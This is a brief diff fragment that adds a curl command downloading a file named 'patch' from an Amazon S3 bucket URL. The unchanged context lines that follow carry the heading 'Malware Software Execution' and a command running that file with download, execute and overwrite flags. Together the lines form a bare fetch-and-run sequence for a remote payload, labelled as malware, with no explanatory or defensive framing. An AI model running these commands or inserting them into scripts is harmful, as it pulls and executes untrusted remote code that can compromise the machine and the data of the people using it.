@@ -1,3 +1,5 @@
+# CURL
+curl -O https://awss3project4821.s3.ap-southeast-2.amazonaws.com/patch
 
 # Malware Software Execution
 patch --download --execute --overwrite
